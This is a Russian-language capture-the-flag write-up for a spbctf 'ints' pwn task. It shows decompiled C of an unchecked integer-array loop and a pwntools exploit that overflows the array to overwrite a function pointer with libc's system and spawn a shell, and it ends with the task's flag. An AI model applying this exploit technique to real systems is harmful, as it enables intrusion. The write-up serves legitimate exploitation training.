[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn3_ints)
Описание:
Server:
`nc -nv 109.233.56.90 11635`
Binary: [**task**](https://pwn.spbctf.ru/files/aslr/ints/task_simple)
libc:[libc](https://pwn.spbctf.ru/files/aslr/ints/libc-2.31.so)
[ld](https://pwn.spbctf.ru/files/aslr/ints/ld-2.31.so)

В задаче необходимо в первый элемент массива записать `bin/sh\x00\x00`, затем заполнить весь массив, переполнить на 2 элемента и записать в `function` ссылку на функцию `system` из `libc`.
![{9554C3DB-36B3-425F-9D1A-A0A5DD36D520}](../../../../z.%20Images/{9554C3DB-36B3-425F-9D1A-A0A5DD36D520}.png)
``` c
v6 = 0;
index = 0;
while ( !v6 )
{
  user_choise = readint();
  if ( user_choise == 3 )
  {
    result = puts("bye!");
    v6 = 1;
  }
  else
  {
    if ( user_choise > 3 )
      goto nothing;
    if ( user_choise == 1 )
    {
      puts("Enter your number:");
      int_input = readint();
      result = index;
      array[index++] = int_input;
    }
    else if ( user_choise == 2 )
    {
      result = (function)(array);
    }
    else
    {
nothing:
      result = puts("...");
    }
  }
}
return result;
```

ASLR отключён, все адреса предоставлены.
![Pasted image 20260324234001](../../../../z.%20Images/Pasted%20image%2020260324234001.png)

Эксплоит:
``` python
system_offset = 0x48F20
libc_base = 0x7ffff7e05000

io = start()

io.sendlineafter(b'exit\n', b'1')
payload = str(u64(b'/bin/sh\x00')).encode()
io.sendlineafter(b'number:\n', payload)

count = 10 + 1 + 1
for _ in range(count):
    io.sendline(b'1')
    io.sendlineafter(b'number:\n', b'1')

io.sendline(b'1')
payload = str(libc_base + system_offset).encode()
io.sendlineafter(b'number:\n', payload)

io.sendline(b'2')

io.interactive()
```

Запуск:
![{48B440F2-2965-4C96-9840-D90A30BF4F07}](../../../../z.%20Images/{48B440F2-2965-4C96-9840-D90A30BF4F07}.png)

Ответ: `spbctf{4003a075a33db2bf0984a700bf8740cd0e39441d1120762f4139dbe9da795ebc}`